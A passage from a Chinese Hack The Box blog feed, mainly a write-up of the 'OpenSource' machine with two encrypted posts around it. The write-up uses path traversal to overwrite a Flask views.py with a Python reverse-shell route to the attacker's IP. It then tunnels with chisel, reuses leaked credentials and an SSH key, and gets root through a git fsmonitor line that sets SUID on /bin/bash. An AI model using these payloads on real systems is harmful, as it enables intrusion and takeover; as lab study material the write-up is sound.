4c3d2d7e3f33e217aeef624b11c9bedcc38b05fea7940fa27bdbc2385f2487bc3a0d6533f9e5937dcce54d9f1ce550557d482927aa1167e47aa3244815a6c6d61973ce51f4348b85a0a8efbe7d419cde9adfb0af74dd65dad60b5db64c642eaab435898e58804720bddc1031638302f9151b81a7e8e3dc7abdfa381bbf6aaa46772a60072a434541b4bce73a09cef17f84b016206f1c4c619a1910dd8269cac828ba64a9bc5c0dc9db43b59bc7b6dbcb8368f74b20c2a92d25799612e7feb018a1d991a91ac30c71c96969dbbc203919c9f44c0bd9db20ec8efedc9af04b82d2ec4be2c6ca8c1b2c7b78085cc18e8017f7ade6d77a5cd419b779c23cb2a95a142b3aa1324737a2590bddf1381f46406ba6dc7c5a553d24c06bdd004ea9f62ec7360f5866b7d31287aa1dfd18dac4a11a39feba646a43312fc6f8d1f00a3adba725c7e3b779d80911db6cfcf1a869560b8323ba26125defa4cb3e1abc6d5266d6cd4ad14b9861ecf3de2c1aa4c490feacd72fe799f77d44a8671823b3e14d42691b98ab5abeb4947d360460bba6f1fa7a24d1d77ae4750d8b649fe3dbee2123ee46821288886eb29b03092c4d9e6213d21d2f4cde1ef10ef30252552c7fdb1492c174bb3c3cc8e8e05b10be84a3bbd33973874f50d3ec165f6d9bb8168bec28afb13dac3b46a3c10e093137ed64ebdd966bc96866a807759c131347151865159cd41634cc30f1c669c14a55c90b275f8c03a0da01e5fa16da186fb93a689f3131f0564a61db6b97b6b7803c6c20de791f5d609a0cae9451e456cbd3e95258878ea36bbd97fd5e01ffe3700f5c5488ad099da8d606cc5e9ebebf9798dbe5420f3cb73693469d136bbb7d7f457ba5b070a0264451309637e25e4a32695d72d408c24b934fc4d53ab6ae711a3c8dff3e2e8da74807da589e1cc5d445086bf2165db186b92d170f4a9ed66cacc98bfd5066176c27ee61101dd170d6bafe70aad3818daa1874aa6e0f45c4547d0fe223741feb4303ae9823cb48236cea1d23ea2b2c91cd3d9bfa95bb52e3db61798f90d63f8839d7e5222e63433a6209bd41515899e42a0103aee2f89411a7c40cc1392d125dedec4b81ef07e10cf1bb739102dec2e8cbe1ae0b11863d2fb3427132179bd67279fc50282648b98acedcee1bbeb84b556a2258aed42147fa0ba74b35382bc22ef819512b2f37af75b6284e5091119e3e065d0cc2075b599639814481684e129fe2aab063b2b9718a6dcc3b9ffc6aa2a878b43769ba57bb3d8e13322f6210c32b3a8709296275940f443a6f7be0b397ca583c3f1f277c856b1c0412d1c473123eae454a5335073d23b61c5cd78985b98ce5742df5ca440cf9c7bfc904eca6da9b6680492fa2a2fb041f38a8217acb4851da0effaa96dd8744ff2a4d76242bac5993c3ac5834bc5375b8ebd0d50c4a37134fc1ee3bcf52ac836eb216283b8ab1403ed6ea618457e49866b26493ab522b9ef52bb1b9d0f091515176e97e05d23bd99b784c2beea9fd7832ac9374ed932af7dacea35fc0605be10a4881a051538a127918a448506896e59362aa6ec3f5ef7b0d63b6f71b24ff87bb5a8eb3c422fec6627320a0403b504d5c7df89d96c60002d287f01fcdd5289c8af0ccba5fbec5083cc2d82445df8b9026dd56d3ea92d949a82da9a2d4e1db47fa66cb434acb6767ca3555e43106f3b0b3a3d61cfaad8d49b265a74dc7e6c506649f13bc02bb1f04358a615d19cac3fbc0d823a9364f6d9cdee483ee092a944dae3327213a354e41dbf8157e80dee28dcc74712cb267a8cd2299b2270f0375078419f1b0111b1a256f791f2f1ab0084099c109d0a777f966555fecd0a6c4da980f1838ae1bf5d2334f8073d0a0b4232fd7fb666703d8695ddfd533f36b7cb4e24f2116a1eee7b050e34ca0c8d353217cd84b8d81992714b236d83baaf85f10ef7b2d3d0289dd7555f0fcb2caf250bab37c36188087e289b8d1368480e83fb22441fafd0ebc1dcaa30edb1c7c15fb761575237354c9cc428ca77e5bf811e3d6476084d4b7d854e6fe40d51614814f793a9d9042062eebd58b74044b1b71bc181fb01c38c806658a78a1615b66151ebb7865e5f972b5a909dfb2d06fd71a33828bdae14a6837c5147fde947ddec0e3def2e062db1e0308c670f1f2b2138f0774ddeaabd43381372ffca72bb6aa4d5795c28ff60bca775e60ea21da55a735225371d6d57af60c1d4f531249f6a86fd65b5e555065bfed030adfca32a1fa87701a2e85c69ddcec0750b5b7d7ea4168900b9269645f7e1a49018b5c0d68003b5d2fadc631901c068b781efdf8c988ffca67f26dfb00d1b98994345e70b27eea558144463d844fef0cebb4ab7ca36e13da19d5da828873dc5085a5c5237beecce7b9372c2fe233313dddbf514d927e33b0d7f15be0bd225b6de65d0b06de67d55688f83d484fcb9b020f8377b9ea4f3061784426bf33451f607c4732229173158f9cca33fd2ba9b0f0e648c477cfd19b7c2be44ce9361c3df00c6814b29697e2e6a22c88f538bca9c0742a2d716df01e09c8e68261206c7d12999c5a1ece9a2a5a069bceecdec7264b9bbbb83907a8e806c7e28c2f3defab3b51934aed77284897f7cd14f5cd3c508a10493d1b137359e382876dcfe90b8fada0877af01fc9c3387d90827be73f48f7a6929eb00e8acb867b4ad2c9a8cf9377073e80f425b917994caeff2225f48260848902410314702359d7b3d121f90d5f5b0d6719cde5a1b9abdc94dd68d5c295cb188ea177a7201d91121840464405a960fc8261658c475ca8a679d0f8268ed1371f2d08fcdd0106ab2d3b503aed063e08a288ce17ee8fd3286cc8792fd634b1f5d5955f60c1be9ad752061eeba3acf2eb0fa98fce946a13ae7e97b063a3fa7cf301d5fa9a46a6335e3cf5e421172a2ed92c386a99947b372bb38a03c5646b187ab4a82e94701f1294023d7f068a0e723822aa883c5788037163b7cf0fe8624e9a011d37f01d7a02fa9d0f59f71370619be0d6c73816a8068cde639cc1bd38bb295bb1ba2673ff260a4d51e5f66d60dd4d28131800ff1b989cc833c8a7e80fffb513c2a84c0fecd225753042214c5e4f4f086e9556e5d977179c5ecaf2718c6f1966a516672b28c3db6979b3eef4b01c0fbd7c28b42bafd36297f36c3a2d21726b6747b9125dc8fd0d7be63d66cd8f3eb0e0be69e68ba9f13def7094c1a321a3b2e1243a29e98dfbce5e7fed5fb5ffb138d78b375dc1b47433ede3be25bedf9a4354db158a8a79f375b3b30eb274ba5c2e4001316aabed47598ffb9d5c609efcdf0a78293ee002b1f0bec50b81f04241431f94500e878ded7c1bd3f7e29e9c3e83096ac39418b680bf1ca45685e9ff396db00081779ec9caa1b2553f4cd20c2139a207d14bc53a7ee493492018ae0ea2e3292b55544e58b11486c7a1234ad3cda1d3d7f23147b4268d18a7fbb9db66bd56d01828e8595206e29397171cc70f1baf359c3e9876b39011a1cae4bbd73c538cba6778dc46d8ec23e9ac39a5e01504a6dd3c5eadd9a4dec61730c4d7fd48a37d82d22869b2b13c3232cb2c0da892a58f858d42a90009454f995ed972d3964f9c68956b84b81b4d093b255646507349baa5907150205299981be657f50bf466ba9e61c3e30d1f5e868231feea54ac873ba25fc9e5f474f4fcd040c1f28288b8c84def88859a68232b1bf901dc4b4a54b3edfc907dec4c6a61d139adc06d75f011c3abb6de40db96e28054550e5b7692090ae3b490d7ab97ab3e8d0167f9cb89d050d2b4a10a935815d06c3ad36c53fdd23411e94acf6d7f8b66d2867868a11b95afef8f508d7aa07b354c592a801dafc12974841eaec77f695f1f3200fae1c66c143c9a2362e387c4d7f03c1d37472b1814a31d909455b592bfc147f923f512238edd5a0bb33dfeb17dd944dec5454e7fc29d90eeeeb10b1b586a1019be0ac271f55aaaae8b0d89faf384c93ff79527ab238008114595b4fba2dda547599bff1b8b3d0547ebecc646f5e7d4d8305c813602a94b24c42e63e42eb000bde6c7cdb53ec09c5208ff8fe475a9298738f896a2e84161d8f8b84f7df2b7744a815720a55917ac6dd20c2dd50ef9bb410abc1f44a5f1b722f74d515fabd51acf2b47b34577a517616d45ff44f973a7d999ff1c73f106d732c02ba16578a805bb3d5ff700ddb12b02ce224bd3beff41126f55409f81ed84170bfef86bd5a4e9a78d20c9dd6680ffc1d2f9a24c4274578080cf956d7fd077d212ab1fed498c793d5eade2bfb54dee6740b24d928a3a9d1181700b644c874c8fe4fd52b00261aac2a2f75d6dc15e842fbbd750f1f0a98f5855873999d62a789aadff5533dadf4f7e89caed93a9b18ea3c1b856f1b33dbdb6e6721714b18a7b9e191166536b7671d346e79ff313cfe03ca1ceac8c3208f050ae77de0cd2b00ae7c7079ba61b5897cc419b9c3fcea9ac99b26f823da1db3141417332560c840e34e74c56327183e1ec194499dde1e6bdd504f01c51946b5ff6f84f2da57b84ca589169477e628da23b6e12f8415367ff9e92b14175af8d9381aa747673bb5a3f0b581aabc57b338c9fe127b642103c17ffa79c6b9062a498406dabf61dfc8860b34944432e58f54038eb79af9ad658a20db1fbb04ecb2f9a8fef162cca4a8b6e64e27ea3bc9c17af9c724e3da4cde4e7ada14da4052a2ca351d2176fe72b78691acaee2857652a7fafe157b0dc6c439634cb9df9ab9dd9441dbdc84d1ede6f16e9b8adb100f4b5a788de18930c85c24eae426028f07449541ba92f8b3a84060d7b61a5e96a1c4d2d3d711b97de40575973e562bfa42d234cbdb3132be21b98be265434db9f60e8c5e0bbcd73aba424d4423969e7f698281bfb53ac0e70b6b63065cc841253d57ff1838451741396010d3571332a118d70567548522953a9c90ab99b789bfa3472630096db8fb68fa37ef46f289480c9fad60823f9f94487cc14ae7745d383012d516cb86aa3c2fc24a94211b99b7ed9e710b959caabff1c900b5ade0f277a66b4d20c7061cfef4e0488a911a5a2575370657ae8919f048f086b50c3d9e637912652188129a21ed7bd3e258cda367c2981e35d98a77755367b15aa238ad8db983d19a61ccdf48ec3421545ba150c21f783b456d0681bba2cfdc863e727228d574c9afe6669374d06e64306da8a8ffa00319ca8d387ac2886285a11a2f41c31caa088da7b34a28e08535081dc706950afec2f6dead00ae2c054fef90af61e9b1a8425494d40964fcb586bb2b8150aae60f954feaea69ebc8a3c33a1176197ac58f1dc1f1c0fcb627fce90fac4a24f8fcccc77569115379f350f486df3806d7dd677a1e7529160fdfafc167a00f31d56265fd81b6e4699c676f33eebe63f05eabfb49b9c1fe8d6c805b097200aee21229f72bd7a61c0077e773b5d4effaaceff7542276b6fd79a0cb0fcd4a833aeba01868c417b6d85d54d9f5abeae0634ddc33f52e6366f313e24783438d0094aba40454ace697612521ed0284dbe8a9944b5f5fe68de0995748922dace3174fa81dea79d16feabc68a8caacc8b51eb2af81b2fdec378ccd0eb4560c3fdf96b43b51d4794dfaabf11f78428efe22a701931e8eff16ba02e6f7be937035d5f9dd7d28e21cf431ab423d74be04f07cdace4b6b423781040bb1ead672b895e48ef08ac631918c5c4ceb5ca0a9e233721749d51a51681909b0bc361fed97c424775a7d3c4a436feff1d73457f664335f9983b10d6b9fc38ea6bb9b32448805ddc179bcc80ab3e3b15f91761506f2d0c889533f99c03a60f5d4e3e667f137557113d9088d1a9cc4fe01ccbcf873f4a38045e80de3bfcea30969fb45e069591910bc3e3efbc3337ca3557b995adb32466e64a97e6225fd3342a3858d6f8724cf9c47e6df8bdb0972aba34831e9384ec9cd79b3504f829ae7f62451e627a9be25f0b07a0ddae52d42a482ec316f7381b6b5e738e56e3bb8b35cead3a763cb8a975795ba5a81b8edc467477b90194dbb76076d5ee0e0718fdb6b233fd563ddcdc7112bd487d5759bb57009cef900fb7cf938e7baf7676dfa43f1081ced0b18f69349fee4b2de92eca1b4ed9c57683dabaaf30695940a794de89eb36ef6d4146db3e8bc494b709cd3f7cf675db8766a763f29ff1225048d8cb710f8a16ecd2aeb7ee60f63eefafe3fce9011700ebdcf691a6e6939e03a37283517e90b0d970ef8b38235e15f35384716123acc2e3e4077c07c49f3af6c39a3d7fd754a761baa46ce2d4ae822d0002e8f27d992ab6cb1a23a09deace0ab8f413301ffa8c100a59d206690ee49650d6c04414c9a230a765b571c00994c3d1197aaf103c6f5bb3947a29e2960dcdbd6b0233b85971965c550feea21e4e2fcdeed16cd564defed08a963fc0a807883517b61f7d668a01d04fd22bf7f19a70609c348de9e021b203827bd7c3688d16dac822c2d31f1d636a34688d078da735f8614b60bc8a39b8cbe97f7462be4c9d5d9f1727ce91540cf113e9ab4c6c9d53611b8fea39992a3416f1eafde747a845bb82036a7c729f72dc282b160438700f517ecd55f3f04e0279aa8bae4833b165cbd666c04e9e99bfce33f39682b20869ba788dacb8303b415beed2d81a5592a21a88b7de300ed7c4ff67d02ae50981662bcf037214c7bcf27956778198aa408cd80a16973e90cecfaa239ecab7027b50468f4e199cac78c5d0071793864a1f8424cdaa65799b378fe47a1c43906aaa3ec9350e106767d7fc33fe29b24376d8bb9b34c2bde16b554a2c7758fd5776295b9b990a32a57e120d04b1ffae26999af54b3c46a22242cd1c62012e3e11ebd342e1fa4bceab931982dfca7446577a2dc7e2cdbdc1697e21a96acca7649a9fa1f32822dc5563782511d411590c54e25a3d5f4f09f5ece5f1fe2dca3ebc923071d54df9e3b7f8ddd84982e0d811d9754753da97a15d63a45e430586608728508b5756224892e908af8b36ffc917e3b9f16900dd7f44eacc7bff30c515b27eaed6e74db069fe6e643a59b2e3ffda6489856605af067d6791a865c71dc2f435930efa446781f5a74dde018ea75b563b27cccee5eac474b94f7f96cbd8cc5226aa6cc6295d924cea17ca039a4c3aa017f90f8f76c76ac8ff750d4040e32bce0d6c1fd76e69a6f5492023fc8cd0010f29927ec4b3fd711cebd33608f8d6ec398e3ac339241537b5cf6c45e64a4f0c2ba261da52470adb99ad0d25341c428a8e8f2291a0a6f1286455c149c0522a5b36f00c1948ab413e007823d88476b00241c76e552acd956773c764120a5272e80f1d62825c0340045b66daa786f1d30a84831b7438a0499f0363b5412972fccb7dfff7c780cf5655df9b85489930451630695f7e6339f3f384da5363e1567fdf1638918870cd0a9e23959a22079d7fc0dcd2c4d22c585eb367be144c8ffe2ba530b0c4390fae339449addeb19c3d2d89ea1471d753d84261568f129a8e9f3f915c48a67baa7df10dbefc32ebdede7a208f598ddaf3f8</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>htb</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>htb OpenSource复盘</title>
    <url>/2024/09/11/htb-OpenSource%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a class="link"   href="https://blog.csdn.net/Purpose_7/article/details/128707843" >https://blog.csdn.net/Purpose_7/article/details/128707843<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://medium.com/@joemcfarland/hack-the-box-opensource-writeup-96d1671b8d78" >https://medium.com/@joemcfarland/hack-the-box-opensource-writeup-96d1671b8d78<i class="fas fa-external-link-alt"></i></a></p>
<p>官方wp</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─# nmap -A -p- --min-rate=1000 -T4 10.10.11.164  </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-11 03:49 PDT</span><br><span class="line">Warning: 10.10.11.164 giving up on port because retransmission cap hit (6).</span><br><span class="line">Stats: 0:04:34 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan</span><br><span class="line">Service scan Timing: About 50.00% done; ETC: 03:55 (0:01:25 remaining)</span><br><span class="line">Nmap scan report for 10.10.11.164</span><br><span class="line">Host is up (0.51s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT     STATE    SERVICE VERSION</span><br><span class="line">22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)</span><br><span class="line">|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)</span><br><span class="line">|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)</span><br><span class="line">80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3</span><br><span class="line">|_http-server-header: Werkzeug/2.1.2 Python/3.10.3</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.1 200 OK</span><br><span class="line">|     Server: Werkzeug/2.1.2 Python/3.10.3</span><br><span class="line">|     Date: Wed, 11 Sep 2024 10:42:24 GMT</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Content-Length: 5316</span><br><span class="line">|     Connection: close</span><br><span class="line">|     &lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">。。。</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     &lt;h1&gt;Error response&lt;/h1&gt;</span><br><span class="line">|     &lt;p&gt;Error code: 400&lt;/p&gt;</span><br><span class="line">|     &lt;p&gt;Message: Bad request version (&#x27;RTSP/1.0&#x27;).&lt;/p&gt;</span><br><span class="line">|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|_    &lt;/html&gt;</span><br><span class="line">|_http-title: upcloud - Upload files for Free!</span><br><span class="line">3000/tcp filtered ppp</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port80-TCP:V=7.94SVN%I=7%D=9/11%Time=66E1767F%P=aarch64-unknown-linux-g</span><br><span class="line">SF:nu%r(GetRequest,1573,&quot;HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.</span><br><span class="line">。。。</span><br><span class="line">OS:164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 993/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   554.57 ms 10.10.16.1</span><br><span class="line">2   391.34 ms 10.10.11.164</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 357.94 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先看80端口，有一个&#x2F;upcloud，&#x2F;download和&#x2F;uploads，看到是flask的，所以在上传点没考虑php。上传py文件后访问服务器没有运行，不考虑。前面nmap扫到一个应用版本<code>Werkzeug/2.1.2</code>没有看到明显可以用的漏洞，不考虑。直接访问&#x2F;console需要pin码，没有看到。</p>
<p>来到&#x2F;download，自动下载一个soucre.zip，解压看看，有个git文件</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911190158.png" ></p>
<p>看到git 日志，注意到指向了public分支，看看有没有别的分支</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911190228.png" ></p>
<p>可以看到有个dev，切换过去，有新的log</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Downloads/source]</span><br><span class="line">└─# git branch</span><br><span class="line">  dev</span><br><span class="line">* public</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/home/kali/Downloads/source]</span><br><span class="line">└─# git checkout dev                                                                                  </span><br><span class="line">Already on &#x27;dev&#x27;</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Downloads/source]</span><br><span class="line">└─# git log         </span><br><span class="line">commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (HEAD -&gt; dev, switch)</span><br><span class="line">Author: gituser &lt;gituser@local&gt;</span><br><span class="line">Date:   Thu Apr 28 13:47:24 2022 +0200</span><br><span class="line"></span><br><span class="line">    ease testing</span><br><span class="line"></span><br><span class="line">commit be4da71987bbbc8fae7c961fb2de01ebd0be1997</span><br><span class="line">Author: gituser &lt;gituser@local&gt;</span><br><span class="line">Date:   Thu Apr 28 13:46:54 2022 +0200</span><br><span class="line"></span><br><span class="line">    added gitignore</span><br><span class="line"></span><br><span class="line">commit a76f8f75f7a4a12b706b0cf9c983796fa1985820</span><br><span class="line">Author: gituser &lt;gituser@local&gt;</span><br><span class="line">Date:   Thu Apr 28 13:46:16 2022 +0200</span><br><span class="line"></span><br><span class="line">    updated</span><br><span class="line"></span><br><span class="line">commit ee9d9f1ef9156c787d53074493e39ae364cd1e05</span><br><span class="line">Author: gituser &lt;gituser@local&gt;</span><br><span class="line">Date:   Thu Apr 28 13:45:17 2022 +0200</span><br><span class="line"></span><br><span class="line">    initial</span><br></pre></td></tr></table></figure>

<p>翻找了一下能够看到dev01用户的密码，直接拿去登陆ssh，尝试失败</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911190732.png" ></p>
<h4 id="立足点"><a href="#立足点" class="headerlink" title="立足点"></a>立足点</h4><p>看一下source其他文件，在source&#x2F;app&#x2F;app&#x2F;views.py，看到文件上传的逻辑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upcloud&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        f = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        file_name = get_file_name(f.filename)</span><br><span class="line">        file_path = os.path.join(os.getcwd(), <span class="string">&quot;public&quot;</span>, <span class="string">&quot;uploads&quot;</span>, file_name)</span><br><span class="line">        f.save(file_path)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;success.html&#x27;</span>, file_url=request.host_url + <span class="string">&quot;uploads/&quot;</span> + file_name)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/uploads/&lt;path:path&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_report</span>(<span class="params">path</span>):</span><br><span class="line">    path = get_file_name(path)</span><br><span class="line">    <span class="keyword">return</span> send_file(os.path.join(os.getcwd(), <span class="string">&quot;public&quot;</span>, <span class="string">&quot;uploads&quot;</span>, path))</span><br></pre></td></tr></table></figure>

<p>看别的wp说是os.path.john，没有过滤直接拼接了，<strong>如果在文件名中插入斜杠字符，则不会考虑路径的其余部分</strong></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911191354.png"  alt="官方wp演示"></p>
<p>所以我们利用这一点，把文件名改为&#x2F;app&#x2F;app&#x2F;views.py，替换原来的views.py(抓包实现)，在里面写入新的功能拿到shell</p>
<p>在新的views.py里面增加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@app.route(&#x27;/revshell/&lt;ip&gt;&#x27;)</span><br><span class="line">def rev_shell(ip):</span><br><span class="line">    import socket,os,pty</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    s.connect((ip,1234))</span><br><span class="line">    os.dup2(s.fileno(),0)</span><br><span class="line">    os.dup2(s.fileno(),1)</span><br><span class="line">    os.dup2(s.fileno(),2)</span><br><span class="line">    pty.spawn(&quot;/bin/sh&quot;)</span><br></pre></td></tr></table></figure>

<p>抓包改文件名上传</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911191929.png" ></p>
<p>本地开启监听，然后访问<code>10.10.11.164/revshell/10.10.16.2</code>，拿到shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911192102.png" ></p>
<h4 id="拿到user"><a href="#拿到user" class="headerlink" title="拿到user"></a>拿到user</h4><p>又看到.dockerenv文件，可以确定是在docker里面，上传一个fscan扫描，看到开了几个ip，本地curl内容都差不多</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911193125.png" ></p>
<p>访问（wget）这几个ip都是和之前直接访问80端口一样的内容。除了172.17.0.1，有个3000端口，是个gitea，尝试搭建个隧道转发出来</p>
<p>这里用到<a class="link"   href="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html" >chisel<i class="fas fa-external-link-alt"></i></a>搭建，在kali上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# ./chisel_1.10.0_linux_arm64 server -p 8000 --reverse</span><br><span class="line">2024/09/11 04:54:47 server: Reverse tunnelling enabled</span><br><span class="line">2024/09/11 04:54:47 server: Fingerprint TolIpzRv4g1qkoHO0zNMWbtOoAgYjXKucuJrFsfNvBE=</span><br><span class="line">2024/09/11 04:54:47 server: Listening on http://0.0.0.0:8000</span><br></pre></td></tr></table></figure>

<p>靶机上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/tmp # ./chisel_1.10.0_linux_amd64 client 10.10.16.2:8000 R:3000:172.17.0.1:3000</span><br><span class="line">./chisel_1.10.0_linux_amd64 client 10.10.14.6:8000 R:3000:172.17.0.1:3000</span><br><span class="line">2024/09/11 11:47:02 client: Connecting to ws://10.10.14.6:8000</span><br></pre></td></tr></table></figure>

<p>然后kali访问127.0.0.1:3000，就能看到gitea，然后之前在git里找到一个dev01的账号密码，这个时候就能派上用场了</p>
<p>登陆后在仓储里看到.ssh目录，可以直接读取id_rsa，复制保存到本地，直接登录了，拿到了dev01的shell</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>拿到后一番搜寻，没什么发现，上传一个pspy64并运行</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911200759.png" ></p>
<p>有一个&#x2F;bin&#x2F;bash &#x2F;usr&#x2F;local&#x2F;bin&#x2F;git-sync（有点难发现），查看内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dev01@opensource:/tmp$ cat /usr/local/bin/git-sync</span><br><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">cd /home/dev01/</span><br><span class="line"></span><br><span class="line">if ! git status --porcelain; then</span><br><span class="line">    echo &quot;No changes&quot;</span><br><span class="line">else</span><br><span class="line">    day=$(date +&#x27;%Y-%m-%d&#x27;)</span><br><span class="line">    echo &quot;Changes detected, pushing..&quot;</span><br><span class="line">    git add .</span><br><span class="line">    git commit -m &quot;Backup for $&#123;day&#125;&quot;</span><br><span class="line">    git push origin main</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p>主要是在git配置dev01的家目录，根据官方wp思路，我们可以修改git的配置文件，这样就能间接地利用root权限执行我们想干的事</p>
<p>在~&#x2F;.git&#x2F;config中写入 <code>fsmonitor = &quot;chmod 4755 /bin/bash&quot;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dev01@opensource:~/.git$ nano config </span><br><span class="line">dev01@opensource:~/.git$ cat config </span><br><span class="line">[core]</span><br><span class="line">        repositoryformatversion = 0</span><br><span class="line">        filemode = true</span><br><span class="line">        bare = false</span><br><span class="line">        logallrefupdates = true</span><br><span class="line">        fsmonitor = &quot;chmod 4755 /bin/bash&quot;</span><br><span class="line">[remote &quot;origin&quot;]</span><br><span class="line">        url = http://opensource.htb:3000/dev01/home-backup.git</span><br><span class="line">        fetch = +refs/heads/*:refs/remotes/origin/*</span><br><span class="line">[branch &quot;main&quot;]</span><br><span class="line">        remote = origin</span><br><span class="line">        merge = refs/heads/main</span><br></pre></td></tr></table></figure>

<p>然后等待一会，再bash -p就能拿到root</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>虽然是easy的靶机，还是相当有特点啊，不愧是htb（，其实多数都是参考来的思路，还是希望自己有耐心一直去探索思路直到成功</p>
<p>第一次接触隧道搭建，需要好好吃透这个原理，还有docker找主机网关的部分也不是很理解，而且网上的wp各有各的解释（，好的部分是帮我复习了一下git的使用吧，还是要继续加油，沉下心。</p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>linux</tag>
        <tag>htb</tag>
      </tags>
  </entry>
  <entry>
    <title>htb-Trickster笔记</title>
    <url>/2024/12/29/htb-Trickster%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
